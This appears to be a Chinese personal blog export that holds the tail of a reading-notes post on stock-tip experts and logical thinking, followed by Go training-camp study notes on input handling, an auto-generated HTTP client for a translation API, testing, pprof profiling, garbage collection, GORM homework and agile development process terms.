4、由此可以得出，他炒股赚的钱，必然比他荐股赚的钱少。 5、如果他炒股赚的钱和他对外荐股赚的差不多，那他放在这两者上的时间精力也应该是差不多的。进而可以得出结论：一个人越是大力气在外推荐股票，越说明他从股票上赚到钱的很少。 6、那我为什么要相信一个自己炒股都很失败的人，推荐的股票呢？ 一个很简单的逻辑就可以得出结论，所以我始终不理解为什么那么多人都愿意相信这种荐股专家。 推荐学科的话，对日常生活最有用的，大致如下：（排名不分先后） 1、历史 2、统计学 3、心理学 4、经济学 5、部分商科书籍：管理类、营销类（这些买最经典的大部头即可，不要买畅销书，都是追热点+鸡汤+成功学） 7、简单的医学（一部分是真正意义上的养生，另一部分是运动健身相关，这部分就是为了让你活的更健康、更抗衰老。身体是革命的本钱） 哲学其实很有用，但这个很看个人兴趣，如果不是喜欢总是喜欢思考的人，个人认为没必要看，瞎理解搞的和民科一样不如不看。 看书的时候，多学以致用，多想想身边哪些地方能用得上这些知识，有哪些事情可以用所学来解释的，慢慢就有效果了。 另外单独说一下逻辑的培养。 逻辑的培养很难直接看书学会，因为生活中的变量太多，没有任何书能直接告诉你，为什么你的恋人今天要和你发脾气。 锻炼逻辑最重要的就是自我反刍，不断的挑战自己。 比如说你朋友和你说，她发现某地域的男生都特别小气，因为她之前的交往过该地区的男朋友。 那你就要思考，她的结论正确吗？她提出的依据能否证明她的结论呢？ 然后你可以继续再拓展，如果我要证明这个地域的男生都很小气，我能想到哪些证据？这些证据是否足以说明这个问题？如果有漏洞，在哪里？ 反复这样思考，逻辑就会越来越严谨的。\n7月23 怨憎会 爱别离 求不得\n","permalink":"https://kevinerr.github.io/posts/read/%E5%8D%9A%E5%AE%A2%E9%98%85%E8%AF%BB/","summary":"理想的亲密关系 第一个永远是真诚，我不希望我完全看不透这个人，或者她做了很多事我无法理解，就缺少沟通这种事我觉得是不ok的。 我希望2个人是在做","title":"博客阅读"},{"content":"day1 go语言上手-基础语言 https://bytedance.feishu.cn/file/boxcnQnHXuDOdzd8CqVid7nQLmg\n随机数 rand.Intn () 函数是个伪随机函数，不管运行多少次都只会返回同样的随机数，因为它默认的资源就是单一值，所以必须调用 rand.Seed (), 并且传入一个变化的值作为参数，如 time.Now().UnixNano() , 就是可以生成时刻变化的值.\n1 2 3  maxNum := 100 rand.Seed(time.Now().UnixNano()) secretNumber := rand.Intn(maxNum)   输入 输入bufio的reader\n1 2 3 4  reader := bufio.NewReader(os.Stdin) input, err := reader.ReadString(\u0026#39;\\n\u0026#39;) //以空格结束 input = strings.TrimSuffix(input, \u0026#34;\\r\\n\u0026#34;) uess, err := strconv.Atoi(input) //转为int      fmt.Scan 获取输入     fmt.Scanf 获取输入，但是可以指定格式，go语言会根据格式解析参数   fmt.Scanln 获取一行的输入，只会获取到一行    1 2 3 4 5 6 7 8 9  var guess int _ , err := fmt.Scanf(\u0026#34;%v\\n\u0026#34;,\u0026amp;guess)   var a1,a2 string fmt.Scanln(\u0026amp;a1,\u0026amp;a2)//如果换行输出不了a2了  var a1,a2 string fmt.Scanf(\u0026#34;%s %s\u0026#34;,\u0026amp;a1,\u0026amp;a2)   自动生成爬虫代码 https://fanyi.caiyunapp.com/#/\n要求是bash\nhttps://curlconverter.com/#go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;io/ioutil\u0026#34; \t\u0026#34;log\u0026#34; \t\u0026#34;net/http\u0026#34; \t\u0026#34;strings\u0026#34; )  func main() { \tclient := \u0026amp;http.Client{} \tvar data = strings.NewReader(`{\u0026#34;trans_type\u0026#34;:\u0026#34;en2zh\u0026#34;,\u0026#34;source\u0026#34;:\u0026#34;good\u0026#34;}`) \treq, err := http.NewRequest(\u0026#34;POST\u0026#34;, \u0026#34;https://api.interpreter.caiyunai.com/v1/dict\u0026#34;, data) \tif err!= nil { \tlog.Fatal(err) \t} \treq.Header.Set(\u0026#34;Accept\u0026#34;, \u0026#34;application/json, text/plain, */*\u0026#34;) \treq.Header.Set(\u0026#34;Accept-Language\u0026#34;, \u0026#34;zh-CN,zh;q=0.9\u0026#34;) \treq.Header.Set(\u0026#34;Connection\u0026#34;, \u0026#34;keep-alive\u0026#34;) \treq.Header.Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json;charset=UTF-8\u0026#34;) \treq.Header.Set(\u0026#34;Origin\u0026#34;, \u0026#34;https://fanyi.caiyunapp.com\u0026#34;) \treq.Header.Set(\u0026#34;Referer\u0026#34;, \u0026#34;https://fanyi.caiyunapp.com/\u0026#34;) \treq.Header.Set(\u0026#34;Sec-Fetch-Dest\u0026#34;, \u0026#34;empty\u0026#34;) \treq.Header.Set(\u0026#34;Sec-Fetch-Mode\u0026#34;, \u0026#34;cors\u0026#34;) \treq.Header.Set(\u0026#34;Sec-Fetch-Site\u0026#34;, \u0026#34;cross-site\u0026#34;) \treq.Header.Set(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\u0026#34;) \treq.Header.Set(\u0026#34;X-Authorization\u0026#34;, \u0026#34;token:qgemv4jr1y38jyq6vhvi\u0026#34;) \treq.Header.Set(\u0026#34;app-name\u0026#34;, \u0026#34;xy\u0026#34;) \treq.Header.Set(\u0026#34;os-type\u0026#34;, \u0026#34;web\u0026#34;) \treq.Header.Set(\u0026#34;sec-ch-ua\u0026#34;, `\u0026#34; Not A;Brand\u0026#34;;v=\u0026#34;99\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;100\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;100\u0026#34;`) \treq.Header.Set(\u0026#34;sec-ch-ua-mobile\u0026#34;, \u0026#34;?0\u0026#34;) \treq.Header.Set(\u0026#34;sec-ch-ua-platform\u0026#34;, `\u0026#34;Windows\u0026#34;`) \tresp, err := client.Do(req) \tif err!= nil { \tlog.Fatal(err) \t} \tdefer resp.Body.Close() \tbodyText, err := ioutil.ReadAll(resp.Body) \tif err!= nil { \tlog.Fatal(err) \t} \tfmt.Printf(\u0026#34;%s\\n\u0026#34;, bodyText) }   运行代码输出\n1  {\u0026#34;rc\u0026#34;:0,\u0026#34;wiki\u0026#34;:{\u0026#34;known_in_laguages\u0026#34;:63,\u0026#34;description\u0026#34;:{\u0026#34;source\u0026#34;:\u0026#34;tangible and intangible thing, except labor tied services, that satisfies human wants and provides utility\u0026#34;,\u0026#34;target\u0026#34;:null},\u0026#34;id\u0026#34;:\u0026#34;Q28877\u0026#34;,\u0026#34;item\u0026#34;:{\u0026#34;source\u0026#34;:\u0026#34;good\u0026#34;,\u0026#34;target\u0026#34;:\u0026#34;\\u5546\\u54c1\u0026#34;},\u0026#34;image_url\u0026#34;:\u0026#34;http:\\/\\/www.caiyunapp.com\\/imgs\\/link_default_img.png\u0026#34;,\u0026#34;is_subject\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;sitelink\u0026#34;:\u0026#34;https:\\/\\/www.caiyunapp.com\\/read_mode\\/?id=625b4b949c0120504d1e7b69\u0026#34;},\u0026#34;dictionary\u0026#34;:{\u0026#34;prons\u0026#34;:{\u0026#34;en-us\u0026#34;:\u0026#34;[g\\u028ad]\u0026#34;,\u0026#34;en\u0026#34;:\u0026#34;[gud]\u0026#34;},\u0026#34;explanations\u0026#34;:[\u0026#34;a.\\u597d\\u7684;\\u5584\\u826f\\u7684;\\u5feb\\u4e50\\u7684;\\u771f\\u6b63\\u7684;\\u5bbd\\u5927\\u7684;\\u6709\\u76ca\\u7684;\\u8001\\u7ec3\\u7684;\\u5e78\\u798f\\u7684;\\u5fe0\\u5b9e\\u7684;\\u4f18\\u79c0\\u7684;\\u5b8c\\u6574\\u7684;\\u5f7b\\u5e95\\u7684;\\u4e30\\u5bcc\\u7684\u0026#34;,\u0026#34;n.\\u5229\\u76ca;\\u597d\\u5904;\\u5584\\u826f;\\u597d\\u4eba\u0026#34;,\u0026#34;ad.=well\u0026#34;],\u0026#34;synonym\u0026#34;:[\u0026#34;excellent\u0026#34;,\u0026#34;fine\u0026#34;,\u0026#34;nice\u0026#34;,\u0026#34;splendid\u0026#34;,\u0026#34;proper\u0026#34;],\u0026#34;antonym\u0026#34;:[\u0026#34;bad\u0026#34;,\u0026#34;wrong\u0026#34;,\u0026#34;evil\u0026#34;,\u0026#34;harmful\u0026#34;,\u0026#34;poor\u0026#34;],\u0026#34;wqx_example\u0026#34;:[[\u0026#34;to the good\u0026#34;,\u0026#34;\\u6709\\u5229,\\u6709\\u597d\\u5904\u0026#34;],[\u0026#34;good, bad and indifferent\u0026#34;,\u0026#34;\\u597d\\u7684,\\u574f\\u7684\\u548c\\u4e00\\u822c\\u7684\u0026#34;],[\u0026#34;good innings\u0026#34;,\u0026#34;\\u957f\\u5bff\u0026#34;],[\u0026#34;good and ...\u0026#34;,\u0026#34;\\u5f88,\\u9887;\\u5b8c\\u5168,\\u5f7b\\u5e95\u0026#34;],[\u0026#34;do somebody\u0026#39;s heart good\u0026#34;,\u0026#34;\\u5bf9\\u67d0\\u4eba\\u7684\\u5fc3\\u810f\\u6709\\u76ca,\\u4f7f\\u67d0\\u4eba\\u611f\\u5230\\u6109\\u5feb\u0026#34;],[\u0026#34;do somebody good\u0026#34;,\u0026#34;\\u5bf9\\u67d0\\u4eba\\u6709\\u76ca\u0026#34;],[\u0026#34;be good for\u0026#34;,\u0026#34;\\u5bf9\\u2026\\u6709\\u6548,\\u9002\\u5408,\\u80dc\\u4efb\u0026#34;],[\u0026#34;be good at\u0026#34;,\u0026#34;\\u5728\\u2026\\u65b9\\u9762(\\u5b66\\u5f97,\\u505a\\u5f97)\\u597d;\\u5584\\u4e8e\u0026#34;],[\u0026#34;as good as one\u0026#39;s word\u0026#34;,\u0026#34;\\u4fe1\\u5b88\\u8bfa\\u8a00,\\u503c\\u5f97\\u4fe1\\u8d56\u0026#34;],[\u0026#34;as good as\u0026#34;,\u0026#34;\\u5b9e\\u9645\\u4e0a,\\u51e0\\u4e4e\\u7b49\\u4e8e\u0026#34;],[\u0026#34;all well and good\u0026#34;,\u0026#34;\\u4e5f\\u597d,\\u8fd8\\u597d,\\u5f88\\u4e0d\\u9519\u0026#34;],[\u0026#34;a good\u0026#34;,\u0026#34;\\u76f8\\u5f53,\\u8db3\\u8db3\u0026#34;],[\u0026#34;He is good at figures . \u0026#34;,\u0026#34;\\u4ed6\\u5584\\u4e8e\\u8ba1\\u7b97\\u3002\u0026#34;]],\u0026#34;entry\u0026#34;:\u0026#34;good\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;word\u0026#34;,\u0026#34;related\u0026#34;:[],\u0026#34;source\u0026#34;:\u0026#34;wenquxing\u0026#34;}}   https://oktools.net/json2go\n转为go结构体\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  type DictResponse struct { \tRc int `json:\u0026#34;rc\u0026#34;` \tWiki struct { \tKnownInLaguages int `json:\u0026#34;known_in_laguages\u0026#34;` \tDescription struct { \tSource string `json:\u0026#34;source\u0026#34;` \tTarget interface{} `json:\u0026#34;target\u0026#34;` \t} `json:\u0026#34;description\u0026#34;` \tID string `json:\u0026#34;id\u0026#34;` \tItem struct { \tSource string `json:\u0026#34;source\u0026#34;` \tTarget string `json:\u0026#34;target\u0026#34;` \t} `json:\u0026#34;item\u0026#34;` \tImageURL string `json:\u0026#34;image_url\u0026#34;` \tIsSubject string `json:\u0026#34;is_subject\u0026#34;` \tSitelink string `json:\u0026#34;sitelink\u0026#34;` \t} `json:\u0026#34;wiki\u0026#34;` \tDictionary struct { \tProns struct { \tEnUs string `json:\u0026#34;en-us\u0026#34;` \tEn string `json:\u0026#34;en\u0026#34;` \t} `json:\u0026#34;prons\u0026#34;` \tExplanations []string `json:\u0026#34;explanations\u0026#34;` \tSynonym []string `json:\u0026#34;synonym\u0026#34;` \tAntonym []string `json:\u0026#34;antonym\u0026#34;` \tWqxExample [][]string `json:\u0026#34;wqx_example\u0026#34;` \tEntry string `json:\u0026#34;entry\u0026#34;` \tType string `json:\u0026#34;type\u0026#34;` \tRelated []interface{} `json:\u0026#34;related\u0026#34;` \tSource string `json:\u0026#34;source\u0026#34;` \t} `json:\u0026#34;dictionary\u0026#34;` }   SOCKS5 https://zhuanlan.zhihu.com/p/438521117\n老师，请问go的字符串拼接效率问题，一般考虑到综合易用性和性能，推荐使用 strings.Builder 来拼接字符串。但为什么有的文章会说标准编译器对使用+运算符的字符串衔接做了特别的优化。 所以，一般说来，在被衔接的字符串的数量是已知的情况下，使用+运算符进行字符串衔接是比较高效的。请问下一般在项目中如何拼接字符串是比较高效合理的呢\nday2 go语言上手-应用实践 https://bytedance.feishu.cn/file/boxcnRmlw9MjbtAMBnOW44y8dZd?hash=7cfc75acc80372c08463b622df90a4b5\ngo依赖管理引进 2个目标 不同环境依赖的版本不同\n控制依赖库的版本\nGOPATH GO Vendor GO Module go.mod\nProxy\ngo get/mod\n测试 单元测试 1 2 3 4 5  package concurrence  func HelloTom() string { \treturn \u0026#34;Tom\u0026#34; }   1 2 3 4 5 6 7 8 9 10 11  package concurrence  import \u0026#34;testing\u0026#34;  func TestHelloTom(t *testing.T) { \toutput := HelloTom() \texpectOutput := \u0026#34;Tom\u0026#34; \tif output != expectOutput { \tt.Errorf(\u0026#34;Expected %s do not match actual %s\u0026#34;, expectOutput, output) \t} }   assert 1 2 3 4 5 6 7 8 9 10 11 12  package concurrence  import ( \t\u0026#34;github.com/stretchr/testify/assert\u0026#34; \t\u0026#34;testing\u0026#34; )  func TestHelloTom(t *testing.T) { \toutput := HelloTom() \texpectOutput := \u0026#34;Tom\u0026#34; \tassert.Equal(t, expectOutput, output) }   覆盖率 1 2 3 4 5 6 7 8  package concurrence  func JudgePassLine(score int16) bool { \tif score \u0026gt;= 60 { \treturn true \t} \treturn false }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  package concurrence  import ( \t\u0026#34;github.com/stretchr/testify/assert\u0026#34; \t\u0026#34;testing\u0026#34; )  func TestJudgePassLineTrue(t *testing.T) { \tisPass := JudgePassLine(70) \tassert.Equal(t, true, isPass) }  func TestJudgePassLineFalse(t *testing.T) { \tisPass := JudgePassLine(50) \tassert.Equal(t, false, isPass) }   1  go test .\\demo_test.go .\\demo.go --cover   Mock测试 基准测试  day3 高质量编程与性能调优实战 https://bytedance.feishu.cn/file/boxcnqqWtT0xgWAIMGWVs7wM6fd\n高质量编程 高质量-正确可靠、简洁清晰\n编码规范 代码格式 gofmt\ngoimports\n注释 解释代码作用\u0026ndash;适合注释公共符号\n解释代码代码是如何做的\u0026ndash;适合代码逻辑比较多的\n解释代码实现的原因\u0026ndash;提供额外上下文\n解释代码什么情况下会出错\u0026ndash;\n公共符号始终要注释,不需要注释实现接口的方法\n命名规范 简洁胜于冗长\n缩略词全大写\n有特定的含义\n函数名不带包的上下文信息\n控制流程 优先处理错误情况，尽早返回\n错误和异常处理 性能优化建议 benchmark Slice 尽量初始化容量信息，避免内存发生拷贝\n因为切片操作并不复制切片指向的元素，创建一个新的切片会复用原来切片的底层数组，所以会有大内存未释放的陷阱\nMap 预分配内存\n字符串处理 +最慢\nstrings.Builder\nbytes.Buffer最快\n空结构体 可以用来实现set\natomic包 锁的实现是由操作系统来实现，属于系统调用\natomic操作通过硬件实现，效率比锁高\n性能调优实战 要依靠数据，而不是猜测\n要定位最大瓶颈而不是细枝末节\n不要过早优化\n不要过度优化\npprof实战 https://blog.wolfogre.com/posts/go-ppof-practice/\ncpu占用情况\ngo tool pprof http://localhost:6060/debug/pprof/profile\n内存分配情况\ngo tool pprof http://localhost:6060/debug/pprof/heap\n阻塞操作情况\ngo tool pprof http://localhost:6060/debug/pprof/block\ngoroutine堆栈\ngo tool pprof http://localhost:6060/debug/pprof/goroutine\n锁竞争\ngo tool pprof http://localhost:6060/debug/pprof/mutex\ngc\ngo tool pprof http://localhost:6060/debug/pprof/allocs\npprof采样过程和原理 性能调优案例 业务服务优化 建立服务性能评估手段\n 服务性能评估手段 请求流量构造 压测范围 性能数据采集  分析性能数据，定位性能评价\n重点优化项改造\n优化效果验证\n进一步优化，服务整体链路分析\nAB实验SDK的优化\n编译器和运行时优化\n课后作业-重点内容 Review   了解下其他语言的编码规范，是否和 Go 语言编码规范有相通之处，注重理解哪些共同点？\n  编码规范或者性能优化建议大部分是通用的，有没有方式能够自动化对代码进行检测？\n  从 github.com/golang/go/t… 中选择感兴趣的包，看看官方代码是如何编写的？\n  使用 Go 进行并发编程时有哪些性能陷阱或者优化手段？\n  在真实的线上环境中，每个场景或者服务遇到的性能问题也是各种各样，搜索下知名公司的官方公众号或者博客，里面有哪些性能优化的案例？比如 eng.uber.com/category/os…\n  Go 语言本身在持续更新迭代，每个版本在性能上有哪些重要的优化点？\n\u0026lt; 作业提交截止时间：5月9日 10:00前 \u0026gt;\n  正确答案：   可以了解下开源项目的编码规范，比如Google开源项目风格指南，\ngoogle.github.io/styleguide\nhttps://zh-google-styleguide.readthedocs.io/en/latest/\n  Go 语言有代码检查工具，可以和CI进行集成，https://github.com/golangci/golangci-lint\n  可以优先看看sync和net包的内容，实际在服务端编程过程中会经常用到\nhttps://github.com/golang/go/tree/master/src/sync\nhttps://github.com/golang/go/tree/master/src/net\n  可以看看Effective Go的并发编程章节，\nhttps://go.dev/doc/effective_go#concurrency\nhttps://github.com/geektutu/high-performance-go\n  实际优化案例，\nhttps://eng.uber.com/how-we-saved-70k-cores-across-30-mission-critical-services/\nhttps://medium.com/coralogix-engineering/optimizing-a-golang-service-to-reduce-over-40-cpu-366b67c67ef9\n  Go 的每次版本更新都有详细的文档说明，可以从中了解性能相关的信息，\nhttps://go.dev/doc/devel/release\n  day4 高性能go语言发行版优化与落地实践 https://bytedance.feishu.cn/file/boxcnRcx62rX5X22Q2WFR5Xm5Oh?hash=cd874ae31e355b9a1f34ae0dad2fad5e\n内存管理优化\n编译器优化\n性能优化的基本问题 性能优化是什么？\n提升软件系统处理能力，减少不必要的耗费、充分发掘计算机算力\n为什么要性能优化\n用户体验\n资源高效利用\n性能优化的2个层面 业务层优化\n语言运行时优化\n性能优化的可维护性 自动内存管理 自动内存管理：由程序语言的运行时系统管理动态内存\n避免手动处理内存\n保证内存使用的正确性和安全性\n评价gc算法：安全性、吞吐率、暂停时间、内存开销\n分代GC 引用计数 go内存管理及优化 分块 缓存 Go对象分配的性能问题 分配路径过长\n小对象居多\nBalanced GC 指针碰撞风格的对象分配\n实现了copying GC\n性能收益\n编译器和静态分析 编译器的结构与编译的流程 编译器后端优化 数据流和控制流分析 过程内和过程间分析 go编译器优化 Tradeoff ：用编译时间换取更高效的机器码\nBeast mode 函数内联\n逃逸分析\n课后作业- 重点内容 Review   从业务层和语言运行时层进行优化分别有什么特点？\n  从软件工程的角度出发，为了保证语言SDK的可维护性和可拓展性，在进行运行时优化时需要注意什么？\n  自动内存管理技术从大类上分为哪两种，每一种技术的特点以及优缺点有哪些？\n  什么是分代假说？分代 GC 的初衷是为了解决什么样的问题？\n  Go 是如何管理和组织内存的？\n  为什么采用 bump-pointer 的方式分配内存会很快？\n  为什么我们需要在编译器优化中进行静态代码分析？\n  函数内联是什么，这项优化的优缺点是什么？\n  什么是逃逸分析？逃逸分析是如何提升代码性能的？\n\u0026lt; 作业提交截止时间：5月12日 10:00前 \u0026gt;\n  正确答案：   业务层的优化需要针对具体问题具体分析；而语言运行时层的优化针对的是更通用的问题，需要在多方面进行 tradeoff。两者都需要自动化性能分析工具的支持。\n  因为语言 SDK 会被大量广泛使用，保证接口的稳定性和一致性至关重要。对已有接口的改动，需要保证兼容性；对新增的接口，需要提供明确的文档说明。对于功能的改动，最好通过选项进行隔离，保证新增改动在不打开的情况下不影响原本的功能。\n  主要分为追踪垃圾回收和引用计数：\na. 追踪垃圾回收\n1 2 3 4 5  1️⃣ 回收内存的条件：回收不可达的对象； 2️⃣ 回收时，首先会扫描 GC roots，例如栈上的对象、全局变量等； 3️⃣ 从 GC roots 出发，沿着指针指向，追踪所有的可达对象； 4️⃣ 追踪完成后，回收所有不可达对象的内存。 复制代码   b. 引用计数\n1 2 3 4 5  1️⃣ 对象有一个与之关联的引用数目。当且仅当引用数大于 0 时对象存活； 2️⃣ 当对象的引用数目为 0 时，内存可以被回收； 3️⃣ 优点：内存管理的开销被平摊到程序运行中，且内存管理不需要了解 runtime 的实现细节； 4️⃣ 缺点：维护引用计数的开销较大；额外的内存开销存储引用计数；无法回收带有环的数据结构；回收大数据结构时依然会造成程序暂停。 复制代码     大量的对象会很快死去。分代 GC 的思想是：针对不同生命周期的对象采取不同策略的内存管理机制。\n  Go 使用 TCMalloc 风格的内存管理方式。\na. TC 是 thread caching 的简写。每个线程都绑定 cache 方便线程快速分配内存；\nb. 内存被划分为特定大小的块。根据对象是否包含指针，将内存块分为 scan 和 noscan 两种；\nc. 根据内存分配请求的大小，选择合适的内存块返回，完成一次内存分配操作；\nd. 回收的内存不会立刻还给操作系统，而是在 Go 内部缓存起来，方便下次分配。\n  每个线程都持有用于对象分配的 buffer，因此指针碰撞方式的内存分配无需加锁或使用 CAS 操作；对象分配的操作非常简单。\n  通过静态分析，我们可以获取更多关于程序的非平凡特性 (non-trivial properties)；这些关于程序的知识可以指导编译器优化。例如通过逃逸分析得知对象并未逃逸出当前函数，因此对象可以在栈上分配，避免频繁在堆上分配对象，降低 GC 的压力。\n  函数内联：将被调用函数的函数体的副本替换到调用位置上，同时重写代码以反映参数的绑定。\na. 优点\n1 2 3  ① 消除函数调用； ② 由于没有了函数调用，过程间分析转化为过程内分析； 复制代码   b. 缺点\n1 2 3  ① 函数体变大； ② 编译生成的 Go 镜像变大。 复制代码     逃逸分析：分析代码中指针的动态作用域，即指针在何处可以被访问。\n通过逃逸分析得知对象并未逃逸出当前函数，因此对象可以在栈上分配，避免频繁在堆上分配对象，降低 GC 的压力。\n  day5 GORM https://bytedance.feishu.cn/file/boxcnct7Jc8Td2Oolfbm6t4HfJg?hash=e52044cf65cc597854fbf299f2a26073\n理解database/sql 基本用法 设计原理 基础概念 GORM使用简介 基本用法 Model定义 惯例约定 关联 GORM设计原理 SQL生成 插件扩展 ConnPool Dialector GORM最佳实践 数据序列化与SQL表达式\n批量数据操作\n代码复用、分库分表、Sharding\n混沌工程/压测\nLogger/Trace\nMigrate\nGen代码生成/Raw SQL\n安全\n课后作业 作业要求：首先实现一个脚本工具：包含一个 User struct, 只包含 UUID string, Name string，Age int，Version int 四个字段，在脚本中使用 gorm ＋ mysql 初始化 DB, 并使用初始化后的 DB 的 AutoMigrate 迁移数据表。\n然后完成一个 Gen (github.com/go-gorm/gen/) 项目，基于上面创建的数据库及表名，通过 Gen 的自动同步库表功能生成 struct People，并给该 struct 生成基本 CRUD 方法，基于 OnConflict Upsert 功能实现 100 个随机用户的创建，其中需要包含重复的 UUID 用户的 Upsert, 在 Upsert 时，如果遇到重复 UUID 中，需要将 Version 更新为 Version + 1。最后再通过一条自定义的Raw SQL 实现，将数据按 Version 分组，并取出 Version 最高的一组的用户总数的功能，该 Raw SQL 需要通过自定义查询方法的形式实现，需要给 People 生成相应的方法名: GetMaxVersionCount。完成后提交代码到 github\n\u0026lt; 作业提交截止时间：5月14日 10:00前 \u0026gt;\n正确答案：   (WIP)\n  参考 github.com/go-gorm/mys… , 实现出 gorm dialector interface (github.com/go-gorm/gor…)\n  通过 docker compose 跑起来环境后，go test 测试通过成后即可\n 通过实现插件的 callbacks 接口，然后通过 Use 注册使用加解密码功能，在实现中需要从 db.Statement.Context 读取到当前租户 ID，然后通过该 ID 进行加解密  通过 docker compose 跑起来环境后，go test 测试通过成后即可\nday6.1 实战项目 https://bytedance.feishu.cn/docx/doxcnDExcSSmRx5R9s8uKmZRpNc\nhttps://live.juejin.cn/4354/yc_teacher\nday6.2 从需求到上线全流程 https://bytedance.feishu.cn/file/boxcnBFwiH4ItgbiBBADJcFTKBc\nhttps://live.juejin.cn/4354/yc_demand\n为什么要有流程    分类 英文 中文 解释     研发模式 Waterfall Model 瀑布模型 瀑布模型（Waterfall Model）最早强调软件或系统开发应有完整之周期，且必须完整的经历周期之每一开发阶段，并系统化的考量分析与设计的技术、时间与资源之投入等。由于该模式强调系统开发过程需有完整的规划、分析、设计、测试及文件等管理与控制，因此能有效的确保系统质量，它已经成为软体业界大多数软件开发的最初标准    The Scaled Agile Framework(SAFe) 规模化敏捷框架     Scrum Scrum 在软件工程中，Scrum是以经验过程为依据，采用迭代、增量的方法来提高产品开发的可预见性并控制风险的理论，Scrum不是一种过程，也不是一项构建产品的技术，而是一个框架，在Scrum框架中可以应用各种过程和技术，Scrum的作用是让开发实践方法的相对功效显现出来以便随时改进。 Scrum是敏捷(Agile)开发的一种实践模式，敏捷开发强调拥抱需求变化，快速响应不断变化的需求，并尽可能快地提供可以工作的软件产品，敏捷最强调的是可以正常工作的软件产品，文档等不是非常的强调（并非不要文档，只是需要必要的文档），敏捷理论认为面对面的沟通交流远比文档更有效。 敏捷开发的Scrum模式是以价值驱动(Value-Driven)的开发模式，即认为用户的需求并不一定需要100%实现，最重要的是将对用户最有价值的功能实现并交付.   流程中的概念 Scrum Master 敏捷教练 Scrum Master是Scrum教练和团队带头人，确保团队合理的运作Scrum，并帮助团队扫除实施中的障碍   Product Owner 产品负责人 产品负责人，确定产品的方向和愿景，定义产品发布的内容、优先级及交付时间，为产品投资回报率负责；    Agile Release Train 敏捷发布火车 敏捷开发的一种发布模式    RD 研发工程师 RD一般指Research and Development Engineer，即研发工程师。    PM 产品经理 产品经理    PRD 产品需求文档 产品需求文档    RD 研发工程师 RD一般指Research and Development Engineer，即研发工程师。    UED 交互设计师 用户体验设计师，交互设计师，界面设计师    QA 测试工程师 指理解产品的功能要求，并对其进行测试，检查软件有没有缺陷（Bug），测试软件是否具有稳定性（Robustness）、安全性、易操作性等性能，写出相应的测试规范和测试用例的专门工作人员。    Backlog 待办事项 产品订单（product backlog）是整个专案的概要文档。产品订单包括所有所需特性的粗略的描述。产品订单是关于将要生产什么样的产品。产品订单是开放的，每个人都可以编辑。产品订单包括粗略的估算，通常以天为单位。估算将帮助产品负责人衡量时程表和优先级（例如，如果\u0026quot;增加拼写检查\u0026quot;特性的估计需要花3天或3个月，将影响产品负责人对该特性的渴望）。 冲刺订单（sprint backlog）是大大细化了的文档，包含团队如何实现下一个冲刺的需求的信息。任务被分解为以小时为单位，没有任务可以超过16个小时。如果一个任务超过16个小时，那么它就应该被进一步分解。冲刺订单上的任务不会被分派，而是由团队成员签名认领他们喜爱的任务。    Grooming Meeting Grooming会议 这个会议上面会由PO来描述下个迭代需要实现的功能，大家讨论要不要干    Planning Meeting Planning会议 这个会议讨论功能具体什么时候干，要估算任务的工作量    基础知识 CNCF 云原生计算基金会 云原生计算是软件开发中的一种方法，它利用云计算“在现代动态环境（例如公共云、私有云和混合云）中构建和运行可扩展的应用程序”。 通过声明性代码部署的容器、微服务、无服务器功能和不可变基础设施等技术是这种架构风格的常见元素。   Kubernetes K8S 生产级别的容器编排系统。Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。    FAAS 函数即服务 函数即服务。仅通过编写函数（function）就能够发布为一个 API 或者服务，实现业务功能的技术体系。由于处理单元为函数粒度，往往底层也能够支持自动扩缩容地更精细化使用计算资源，开发侧支持事件驱动，可由消息或多种 Hook 触发，同时拥有快速上线、按需付费等优点。    APAAS 平台即服务 是一个为应用程序服务提供开发和部署环境的云服务    IDE IDE 用于提供程序开发环境的应用程序。一般包括代码编辑器、编译器、调试器和图形用户界面等工具    Git Git 分布式的版本管理系统    Merge/Rebase 合并/变基 处理代码分支的操作，将不同的分支整合成一个的两种方式     后端的定位  瀑布模式  按照时间节点参与会议，产出文档（系统分析，概要设计，详细设计，接口文档，提测文档等） 按照时间节点交付测试 按照时间节点发布   敏捷团队  跟随迭代制定规划，进行开发 参与待办事项整理会议（Backlog Grooming Meeting）  PO描述下个迭代希望实现的用户故事   迭代计划会议（Sprint Planning Meeting）  选择迭代的任务和估算工作量   每日站会（Standup Meeting）  昨天你做了什么? 今天你将要做什么? 你有需要帮助的地方吗?   评审会（Retrospective Meeting）  小组向产品负责人展示迭代工作结果   反思会（Retrospective Meeting）  在每个迭代后召开简短的反思会，总结哪些事情做得好，哪些事情做得不好      团队协作 一个具体的迭代时间表：\n2. 有哪些流程 需求阶段   不要浪费时间讨论不应该存在的问题\n  站在用户的角度思考\n  给出后端系统视角的建议，估算任务优先级\n  开发阶段   云原生下的开发：\n 容器化技术 微服务技术 WebIDE    团队分支策略：\n 为什么会有分支策略 有哪些分支策略 合并的方式    代码规范\n 养成良好的注释习惯，超过三个月的代码，自己都会忘了当时在想什么 不要有魔法数字，魔法字符串 重复的逻辑抽象成公共的方法，不要copy代码 正确使用IDE的重构功能，防止修改错误    自测\n 单元测试 功能环境测试 测试数据构造    文档\n 大型改造需要有技术设计文档，方案评审 好的接口文档能更方便的和前端进行沟通    测试阶段  功能测试  功能测试，是为了测试一个新开发的功能，因此需要有能模拟线上的开发和测试环境，环境之间能相互隔离，这样可以独立验证不同的新功能\n  集成测试：集成测试，是为了把几个功能合在一起测试，因为可能各个新功能独立测试没有问题，但是合在一起却产生了bug\n  回归测试：回归测试是为了验证老的功能不被新的改动影响\n  发布阶段   各种发布模式\n 